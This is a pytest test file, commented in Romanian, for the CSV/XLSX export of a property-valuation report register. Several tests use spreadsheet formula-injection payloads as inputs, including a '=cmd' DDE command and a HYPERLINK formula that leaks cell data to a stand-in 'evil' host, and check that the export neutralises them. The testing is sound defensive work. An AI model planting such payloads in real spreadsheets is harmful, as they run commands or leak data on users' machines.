"""Registrul de evidenta a rapoartelor de evaluare (Procedura §6): randuri + export CSV/XLSX."""
from __future__ import annotations

import io
import zipfile

import pytest


@pytest.fixture
def baza(tmp_path, monkeypatch):
    monkeypatch.setenv("OUTPUT_DIR", str(tmp_path / "date"))
    return tmp_path


def _creeaza(**wizard):
    import evaluare.dosare_fs as fs
    w = {"scop": "garantare", "tip_proprietate": "casa", "nume_client": "Pop Ion",
         "numar_cadastral": "12345", "data_raportului": "2026-02-01"}
    w.update(wizard)
    return fs.creeaza("L1", "Evaluator", w)


def test_rand_acopera_campurile_sectiunii_6(baza):
    from evaluare.registru import registru as reg
    _creeaza(beneficiar="Banca X", proprietar="Pop Ion", onorariu="1500",
             data_evaluarii="2026-01-20", data_predarii="2026-02-03",
             verificator_intern_nume="Ionescu", data_verificare_interna="2026-01-31",
             risc_aml="sporit", nr_contract="77/2026", data_contract="2026-01-10",
             observatii_registru="fara observatii")
    r = reg.randuri()
    assert len(r) == 1
    row = r[0]
    assert row["nr_lucrare"].endswith("/0001")
    assert row["contract"] == "77/2026 / 2026-01-10"
    assert row["client"] == "Pop Ion"
    assert row["utilizatori"] == "Banca X"
    assert "nr. cad. 12345" in row["obiect"]
    assert row["proprietar"] == "Pop Ion"
    assert row["tip"] == "PI"                                  # bun imobil
    assert row["scop"] == "Garantarea creditului ipotecar"    # slug -> eticheta
    assert row["onorariu"] == "1500"
    assert row["data_evaluarii"] == "2026-01-20"
    assert row["data_raportului"] == "2026-02-01"
    assert row["data_predarii"] == "2026-02-03"
    assert row["verificator"] == "Ionescu / 2026-01-31"
    assert row["risc_aml"] == "ridicat"                        # sporit -> ridicat (§6)
    assert row["observatii"] == "fara observatii"


def test_randuri_sortate_dupa_nr_lucrare(baza):
    from evaluare.registru import registru as reg
    _creeaza(nume_client="Unu")
    _creeaza(nume_client="Doi")
    _creeaza(nume_client="Trei")
    numere = [r["nr_lucrare"] for r in reg.randuri()]
    assert numere == sorted(numere)
    assert len(numere) == 3 and len(set(numere)) == 3


def test_csv_are_bom_antete_si_valori(baza):
    from evaluare.registru import registru as reg
    _creeaza(nume_client="Popescu", onorariu="2200")
    csv = reg.csv_text()
    assert csv.startswith("﻿")                            # BOM pentru Excel RO
    assert "Nr. identificare" in csv and "Onorariu" in csv
    assert "Popescu" in csv and "2200" in csv


def test_xlsx_este_zip_valid_cu_valori(baza):
    from evaluare.registru import registru as reg
    _creeaza(nume_client="Georgescu", risc_aml="redus")
    data = reg.xlsx_bytes()
    assert data[:2] == b"PK"                                   # semnatura ZIP
    z = zipfile.ZipFile(io.BytesIO(data))
    necesare = {"[Content_Types].xml", "_rels/.rels", "xl/workbook.xml",
                "xl/_rels/workbook.xml.rels", "xl/worksheets/sheet1.xml"}
    assert necesare.issubset(set(z.namelist()))
    sheet = z.read("xl/worksheets/sheet1.xml").decode("utf-8")
    assert "Georgescu" in sheet
    assert "Nr. identificare" in sheet                         # antetul e primul rand
    assert "scăzut" in sheet                                   # redus -> scăzut


def test_xlsx_escapeaza_xml(baza):
    from evaluare.registru import registru as reg
    _creeaza(nume_client="A & <B>")
    sheet = zipfile.ZipFile(io.BytesIO(reg.xlsx_bytes())).read("xl/worksheets/sheet1.xml").decode()
    assert "A &amp; &lt;B&gt;" in sheet                        # caractere XML escapate
    assert "<B>" not in sheet.replace("&lt;B&gt;", "")         # niciun '<B>' neescapat


def test_registru_gol(baza):
    from evaluare.registru import registru as reg
    assert reg.randuri() == []
    assert reg.csv_text().startswith("﻿")                 # doar antetul, fara randuri
    assert reg.xlsx_bytes()[:2] == b"PK"


# ── F1/H14-3: neutralizare formula-injection (CSV + XLSX) ─────────────────────
def test_csv_neutralizeaza_formula_injection(baza):
    from evaluare.registru import registru as reg
    _creeaza(nume_client="=cmd|'/c calc'!A1",
             observatii_registru="@SUM(1+1)",
             proprietar="-2+3",
             beneficiar='=HYPERLINK("http://evil/?leak="&A2,"click")')
    csv = reg.csv_text()
    # fiecare celula periculoasa e prefixata cu apostrof -> Excel o trateaza ca text, nu formula LIVE
    assert "'=cmd|" in csv
    assert "'@SUM(1+1)" in csv
    assert "'-2+3" in csv
    assert "'=HYPERLINK" in csv
    # nicio celula nu mai INCEPE cu un caracter de formula neneutralizat
    assert "\n=" not in csv and "\n@" not in csv
    assert ',=cmd' not in csv and ',@SUM' not in csv


def test_xlsx_neutralizeaza_formula_injection(baza):
    from evaluare.registru import registru as reg
    _creeaza(nume_client="=cmd|'/c calc'!A1", observatii_registru="@SUM(1+1)")
    sheet = zipfile.ZipFile(io.BytesIO(reg.xlsx_bytes())).read(
        "xl/worksheets/sheet1.xml").decode("utf-8")
    # textul ostil ramane ca inline string, dar prefixat cu apostrof (neutralizat)
    assert "&apos;=cmd|" in sheet or "'=cmd|" in sheet
    assert "&apos;@SUM" in sheet or "'@SUM" in sheet


def test_xlsx_neutralizare_nu_atinge_numerele(baza):
    from evaluare.registru import registru as reg
    _creeaza(nume_client="Pop", onorariu="1500")
    sheet = zipfile.ZipFile(io.BytesIO(reg.xlsx_bytes())).read(
        "xl/worksheets/sheet1.xml").decode("utf-8")
    # onorariul e text in registru (vine din `_g`), dar nu incepe cu caracter de formula -> neprefixat
    assert "'1500" not in sheet
    assert "1500" in sheet


# ── H14-2: caractere de control invalide XML -> xlsx ramane valid ─────────────
def test_xlsx_curata_caractere_de_control(baza):
    from defusedxml.ElementTree import fromstring as xml_fromstring

    from evaluare.registru import registru as reg
    _creeaza(nume_client="bad\x01\x02\x0bchar", observatii_registru="ok\ttab\nnewline")
    data = reg.xlsx_bytes()
    sheet = zipfile.ZipFile(io.BytesIO(data)).read("xl/worksheets/sheet1.xml").decode("utf-8")
    # caracterele de control interzise (0x01/0x02/0x0b) nu mai ajung RAW in XML
    assert "\x01" not in sheet and "\x02" not in sheet and "\x0b" not in sheet
    # XML-ul ramane bine-format (Excel l-ar deschide)
    xml_fromstring(sheet)
    # TAB/newline (permise in XML) sunt pastrate
    assert "tab" in sheet and "newline" in sheet


def test_xlsx_control_apoi_formula_nu_scapa_neutralizarea(baza):
    # `\x01=cmd`: dupa curatarea caracterului de control, `=cmd` NU trebuie sa ramana prefix de formula.
    from evaluare.registru import registru as reg
    _creeaza(nume_client="\x01=cmd|'/c calc'!A1")
    sheet = zipfile.ZipFile(io.BytesIO(reg.xlsx_bytes())).read(
        "xl/worksheets/sheet1.xml").decode("utf-8")
    assert "\x01" not in sheet
    assert "&apos;=cmd|" in sheet or "'=cmd|" in sheet     # neutralizat (apostrof) dupa curatare


# ── H14-4: risc_aml lista/dict (dosar fabricat) -> rand() nu arunca TypeError ──
def test_rand_risc_aml_nehashabil_nu_arunca():
    from evaluare.registru import registru as reg
    # dosar.json fabricat manual cu risc_aml lista -> nu mai pica pe `dict.get(cheie_nehashabila)`
    row = reg.rand({"uuid": "x", "risc_aml": ["sporit"], "wizard": {}})
    assert row["risc_aml"] == "['sporit']"          # stringificat, nu exceptie
    row2 = reg.rand({"uuid": "y", "risc_aml": {"k": "v"}, "wizard": {}})
    assert isinstance(row2["risc_aml"], str)


def test_randuri_sare_dosar_otravit_in_loc_de_500(baza):
    import evaluare.dosare_fs as fs
    from evaluare.registru import registru as reg
    _creeaza(nume_client="Bun")                      # un dosar valid
    # fabrica un dosar.json cu risc_aml nehashabil direct pe disc
    import json
    uid = fs.creeaza("L2", "Eval", {"nume_client": "Otravit"})
    cale = fs.folder_dosar(uid) / "dosar.json"
    raw = json.loads(cale.read_text(encoding="utf-8"))
    raw["risc_aml"] = ["lista", "ostila"]
    cale.write_text(json.dumps(raw, ensure_ascii=False), encoding="utf-8")
    randuri = reg.randuri()                           # NU arunca; dosarul otravit e procesat tolerant
    nume = {r["client"] for r in randuri}
    assert "Bun" in nume                              # dosarul valid e tot acolo


# ── H14-5: cache pe semnatura de mtime ────────────────────────────────────────
def test_randuri_cache_invalideaza_la_dosar_nou(baza):
    from evaluare.registru import registru as reg
    _creeaza(nume_client="Unu")
    r1 = reg.randuri()
    assert len(r1) == 1
    r1b = reg.randuri()                               # cache hit (nimic schimbat)
    assert len(r1b) == 1
    # mutarea returnata nu trebuie sa contamineze cache-ul intern
    r1b[0]["client"] = "MUTAT"
    assert reg.randuri()[0]["client"] == "Unu"
    _creeaza(nume_client="Doi")                       # schimba semnatura -> cache miss
    assert len(reg.randuri()) == 2
